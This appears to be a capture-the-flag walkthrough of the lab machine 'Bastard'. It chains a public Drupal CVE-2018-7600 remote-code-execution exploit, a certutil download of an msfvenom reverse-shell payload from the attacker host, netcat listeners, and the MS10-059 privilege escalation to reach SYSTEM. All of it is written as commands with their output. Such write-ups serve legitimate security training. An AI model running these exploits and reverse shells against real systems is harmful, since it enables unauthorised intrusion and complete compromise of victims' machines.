# Bastard

<pre>nmap -p 80,135,49154 -sV -A -Pn 10.10.10.9      

PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-title: Welcome to Bastard | Bastard
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Microsoft-IIS/7.5

135/tcp   open  msrpc   Microsoft Windows RPC

49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</pre>

/CHANGELOG.txt
- Drupal 7.54

## CVE-2018-7600
https://github.com/pimps/CVE-2018-7600

<pre>python drupa7-CVE-2018-7600.py http://10.10.10.9/ -c "whoami"

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-cAMZtD6OxF6VBMvqu-jsy8_6YyWnS5hMyYaWUYrH0Xs
[*] Triggering exploit to execute: whoami

nt authority\iusr</pre>

<pre>python drupa7-CVE-2018-7600.py http://10.10.10.9/ -c 'systeminfo | findstr /B /C:"OS Name" /C:"OS Version"'

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-6vXCDlelylkpC1-w1fCTJMyujnx-prntwwDu5d4AnCE
[*] Triggering exploit to execute: systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600</pre>

- Create payload

<pre>msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f exe > shell.exe</pre>

- Create directory on target machine using drupa7-CVE-2018-7600.py

<pre>python drupa7-CVE-2018-7600.py http://10.10.10.9/ -c 'mkdir C:\temp'</pre>

- Upload payload to target machine

<pre>python drupa7-CVE-2018-7600.py http://10.10.10.9/ -c 'certutil -urlcache -f http://10.10.14.8/shell.exe c:\temp\shell.exe'</pre>

- netcat to receive reverse shell

<pre>nc -nvlp 4444</pre>

- Execute shell.exe using drupa7-CVE-2018-7600.py

<pre>python drupa7-CVE-2018-7600.py http://10.10.10.9/ -c 'c:\temp\shell.exe'</pre>

<pre>netcat -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.9] 49229
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\inetpub\drupal-7.54>


C:\inetpub\drupal-7.54>whoami
whoami
nt authority\iusr</pre>

## Privilege Escalation using Windows Exploit Suggester - MS10-059

- Save output from `systeminfo` command into sysinfo.txt

<pre>./windows-exploit-suggester.py --database 2024-05-14-mssb.xls --systeminfo sysinfo.txt
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'
[*] 
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical</pre>

https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe

- Transferred MS10-059.exe across to target machine using certutil
- netcat listener on attacker machine
- execute MS10-059.exe and receive reverse shell

<pre>C:\inetpub\drupal-7.54>MS10-059.exe 10.10.14.8 5555


nc -nvlp 5555                             
listening on [any] 5555 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.9] 49233
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\inetpub\drupal-7.54>whoami
whoami
nt authority\system</pre>